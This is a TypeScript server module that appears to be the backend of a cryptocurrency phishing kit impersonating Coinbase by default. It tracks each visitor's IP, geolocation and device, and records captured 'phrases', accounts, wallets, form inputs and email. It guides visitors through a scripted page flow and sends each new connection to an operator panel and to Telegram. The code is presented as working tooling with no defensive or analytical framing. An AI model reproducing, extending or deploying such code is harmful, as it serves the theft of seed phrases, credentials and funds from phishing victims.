import crypto from 'node:crypto';
import { serverState, type Visitor } from './state.js';
import { broadcast, broadcastStats } from './websocket.js';
import { lookupIp } from './geoip.js';
import { dbGetDomainByHost, dbSetVisitorFlowSteps } from './database.js';
import { firstValidFlowStep, isValidFlowLabel } from './funnel.js';
import { notifyVisitorConnect, routesEquivalent } from './telegram.js';
import { initializeGoldenFlow } from './goldenFlow.js';

export interface VisitorConnectInput {
	ip: string;
	userAgent?: string;
	host?: string;
	path?: string;
	brand?: string;
	page?: string;
	flow?: string;
	module?: string;
	platform?: string;
	email?: string;
}

function parseUserAgent(ua: string): string {
	if (!ua) return 'Unknown';
	const isMobile = /mobile|android|iphone|ipad/i.test(ua);
	const platform = isMobile ? 'Mobile' : 'Desktop';
	if (ua.includes('Firefox')) return `${platform} - Firefox`;
	if (ua.includes('Edg')) return `${platform} - Edge`;
	if (ua.includes('Safari') && !ua.includes('Chrome')) return `${platform} - Safari`;
	if (ua.includes('Chrome')) return `${platform} - Chrome`;
	return `${platform} - Other`;
}

function parseBrowserName(ua: string): string {
	if (!ua) return 'Unknown';
	if (ua.includes('Firefox')) return 'Firefox';
	if (ua.includes('Edg')) return 'Edge';
	if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
	if (ua.includes('Chrome')) return 'Chrome';
	return 'Other';
}

function pathToFlow(path: string): string {
	const segment = path.replace(/^\//, '').split('/')[0] || 'loading';
	return `crypto/${segment}`;
}

/** Register or refresh a visitor session (panel + Telegram on first connect). */
export async function registerVisitorConnect(input: VisitorConnectInput): Promise<Visitor> {
	const ip = input.ip || 'unknown';
	cancelPendingDisconnect(ip);
	const userAgent = input.userAgent || '';
	const host = (input.host || '').toLowerCase();
	const path = input.path || '/loading';
	const clientPageLabel =
		input.brand && input.page ? `${input.brand}/${input.page}` : '';
	const pageRoute = clientPageLabel || path;

	const domain = host ? dbGetDomainByHost(host) : undefined;
	const module = input.module || domain?.module || input.brand || 'Coinbase';

	const existing = serverState.visitors.get(ip);
	const domainFlow =
		domain?.flowId
			? serverState.flows.find((f) => f.id === domain.flowId && f.active)
			: undefined;

	const flow = input.flow || existing?.flow || domainFlow?.name || pathToFlow(path);
	const platform = input.platform || 'crypto';
	const capturedBy = host || input.host || '';

	const geo = await lookupIp(ip);
	const isNewSession = !existing || existing.status === 'offline';
	const previousPageRoute = existing?.lastPageRoute || existing?.lastPage || '';

	let initialFlowSteps = existing?.flowSteps?.length
		? existing.flowSteps
		: [];
	let isGoldenFlow = existing?.isGoldenFlow ?? true;

	if (initialFlowSteps.length === 0) {
		if (domainFlow) {
			initialFlowSteps = domainFlow.steps.map((page) => ({
				page,
				status: isValidFlowLabel(page) ? 'not_started' as const : 'completed' as const
			}));
			isGoldenFlow = false;
		} else {
			initialFlowSteps = initializeGoldenFlow();
			isGoldenFlow = true;
		}
	}

	const flowEntryLabel =
		!existing && domainFlow ? firstValidFlowStep(domainFlow.steps) || '' : '';

	const effectivePage = flowEntryLabel || pageRoute;

	const visitor: Visitor = {
		ip,
		flag: geo.flag,
		city: geo.city,
		region: geo.region,
		country: geo.country,
		status: 'online',
		flow,
		lastSeen: 'now',
		connectedAt: existing?.connectedAt ?? Date.now(),
		phrases: existing?.phrases ?? 0,
		accounts: existing?.accounts ?? 0,
		uploads: existing?.uploads ?? 0,
		platform,
		device: parseUserAgent(userAgent),
		lastPage: effectivePage,
		lastPageRoute: existing?.lastPageRoute || effectivePage,
		flowSteps: initialFlowSteps,
		inputs: existing?.inputs ?? {},
		wallets: existing?.wallets ?? [],
		screenSize: existing?.screenSize ?? '',
		timezone: existing?.timezone ?? '',
		browser: parseBrowserName(userAgent),
		os: existing?.os ?? '',
		cpuCores: existing?.cpuCores ?? 0,
		email: input.email || existing?.email || '',
		module,
		userId: existing?.userId || crypto.randomUUID(),
		userAgent,
		flowBypassed: existing?.flowBypassed ?? false,
		isGoldenFlow,
		capturedBy: capturedBy || existing?.capturedBy || '',
		lastTwoDigits: existing?.lastTwoDigits ?? '',
		emailFrom: existing?.emailFrom ?? '',
		emailTo: existing?.emailTo ?? ''
	};

	serverState.addVisitor(visitor);

	if (!existing && initialFlowSteps.length > 0) {
		try {
			dbSetVisitorFlowSteps(ip, initialFlowSteps);
		} catch {
			/* non-critical */
		}
	}

	if (isNewSession) {
		const logEntry = serverState.addLogEntry(`Visitor ${ip} connected — ${flow}`, 'connect');
		broadcast({ type: 'visitor:connected', payload: visitor });
		broadcast({ type: 'log:new', payload: logEntry });
		broadcastStats();

		notifyVisitorConnect({
			ip: visitor.ip,
			userId: visitor.userId,
			city: visitor.city,
			region: visitor.region,
			country: visitor.country,
			browser: visitor.browser,
			platform: visitor.platform,
			module: visitor.module,
			capturedBy: visitor.capturedBy,
			lastPageRoute: visitor.lastPageRoute
		}).catch(() => {});
	} else {
		broadcast({ type: 'visitor:updated', payload: visitor });
		broadcastStats();

		const navigatedTo = clientPageLabel || pageRoute;
		if (previousPageRoute && navigatedTo && !routesEquivalent(previousPageRoute, navigatedTo)) {
			const logEntry = serverState.addLogEntry(
				`Visitor ${ip} moved to ${navigatedTo}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			// Telegram: each step is reported via notifyPageAction (Continue, codes, etc.)
		}
	}

	return visitor;
}

const disconnectTimers: Map<string, ReturnType<typeof setTimeout>> = new Map();
const DISCONNECT_GRACE_MS = 5000;

export function registerVisitorDisconnect(ip: string): void {
	if (!ip) return;

	if (disconnectTimers.has(ip)) return;

	const timer = setTimeout(() => {
		disconnectTimers.delete(ip);
		const visitor = serverState.removeVisitor(ip);
		if (!visitor) return;

		const logEntry = serverState.addLogEntry(`Visitor ${ip} disconnected`, 'disconnect');
		broadcast({ type: 'visitor:disconnected', payload: { ip } });
		broadcast({ type: 'log:new', payload: logEntry });
		broadcastStats();
	}, DISCONNECT_GRACE_MS);

	disconnectTimers.set(ip, timer);
}

export function cancelPendingDisconnect(ip: string): void {
	const timer = disconnectTimers.get(ip);
	if (timer) {
		clearTimeout(timer);
		disconnectTimers.delete(ip);
	}
}
